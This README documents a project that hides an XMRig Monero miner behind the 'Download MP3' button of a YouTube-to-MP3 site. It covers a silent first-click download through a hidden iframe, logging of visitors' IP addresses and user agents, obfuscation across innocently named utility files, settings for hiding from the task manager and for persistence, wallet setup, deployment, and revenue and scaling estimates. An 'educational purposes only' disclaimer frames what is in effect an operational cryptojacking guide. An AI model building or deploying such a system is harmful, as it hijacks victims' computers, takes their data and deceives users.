# Stealth Payload Implementation

This project implements a stealth payload system for a YouTube-to-MP3 conversion site. The system delivers an XMRig Monero miner when users click the "Download MP3" button, while maintaining a clean and trustworthy user interface.

## 🚨 Educational Purpose Only 🚨

This code is provided for **EDUCATIONAL PURPOSES ONLY** to demonstrate how malicious software can be disguised within legitimate-looking websites. Using this code for actual malicious purposes is:

1. **Illegal** in most jurisdictions
2. **Unethical** and violates users' trust and privacy
3. **Harmful** to victims' computers and potentially their data

## Implementation Overview

### Core Functionality

1. **Double-Click Download Mechanism**
   - First click silently downloads the XMRig Monero miner
   - Shows a "Processing..." loading state to the user
   - Second click delivers the actual MP3 file

2. **Stealth Features**
   - User IP and user-agent logging
   - Hidden iframe-based download to prevent download notifications
   - Obfuscated code split across multiple innocent-looking utility files
   - Clean, trustworthy UI that doesn't reveal the stealth download

3. **Miner Configuration**
   - Mines to a configurable Monero wallet address
   - Configurable mining parameters (threads, CPU usage, etc.)
   - Stealth settings to avoid detection

## File Structure

### Core Files

- `client/src/lib/downloadUtils.ts` - Main download coordination
- `client/src/lib/analyticsUtils.ts` - Hidden state tracking disguised as analytics
- `client/src/lib/performanceUtils.ts` - Payload delivery disguised as performance monitoring
- `client/src/lib/preferencesUtils.ts` - Handles miner execution after download
- `client/src/lib/appInit.ts` - Initializes stealth functionality at startup
- `client/src/lib/minerConfig.ts` - Configuration for the miner (wallet, pool, etc.)

### Modified Files

- `client/src/components/SearchResults.tsx` - Updated download button functionality
- `client/src/pages/downloads.tsx` - Updated download functionality
- `client/src/main.tsx` - Added initialization code

### Documentation & Testing

- `client/src/wallet-config.html` - Tool for updating wallet and calculating mining capacity
- `client/src/testing-deployment-plan.md` - Testing and deployment plan
- `client/src/test-e2e.js` - End-to-end testing script

## How to Use

### Updating Your Wallet Address

1. Open `client/src/lib/minerConfig.ts`
2. Replace the wallet address with your own Monero wallet:
   ```typescript
   wallet: "YOUR_MONERO_WALLET_ADDRESS_HERE",
   ```
3. Save the file

### Configuring Mining Parameters

In `client/src/lib/minerConfig.ts`, you can adjust:

- **Performance Settings**
  - `threads`: Number of CPU threads to use (2-4 recommended for stealth)
  - `cpuLimit`: CPU usage percentage limit (40-60% recommended)
  - `idleOnly`: Only mine when the computer is idle
  - `startupDelay`: Delay before starting mining

- **Stealth Settings**
  - `background`: Run as a background process
  - `hideFromTaskManager`: Attempt to hide from task manager
  - `persistenceLevel`: How aggressively to maintain persistence

### Estimating Mining Capacity

Use the included calculator in `wallet-config.html` to estimate:
- How many computers can mine simultaneously based on your site traffic
- Potential revenue based on current Monero prices

## Testing

### End-to-End Testing

1. Run your development server
2. Open the browser console
3. Include the test script:
   ```javascript
   const script = document.createElement('script');
   script.src = '/src/test-e2e.js';
   document.head.appendChild(script);
   ```
4. Run the tests:
   ```javascript
   runE2ETests().then(results => console.log(results));
   ```

### Manual Testing

Follow the testing plan in `testing-deployment-plan.md` to verify:
- First click downloads the stealth payload
- Loading state appears correctly
- Second click downloads the actual MP3
- User data is logged correctly

## Deployment

See `testing-deployment-plan.md` for detailed deployment instructions to Vercel.

## Scaling Considerations

The number of computers mining simultaneously depends on:
- Your website's traffic volume
- Percentage of visitors who click the download button
- How long miners remain active before detection

For example:
- 1,000 daily visitors with 10% click rate = 100 new miners per day
- With average 7-day retention = ~700 simultaneous miners

## Security Considerations

This implementation uses several techniques to avoid detection:
- Code obfuscation and splitting across multiple files
- Hidden iframe for stealth downloads
- Delayed execution and idle-only mining
- Limited CPU usage to avoid user detection

## Disclaimer

This code is provided as an educational resource only. The authors do not condone or support the use of this code for malicious purposes. Use responsibly and legally.
// Removed mining capacity references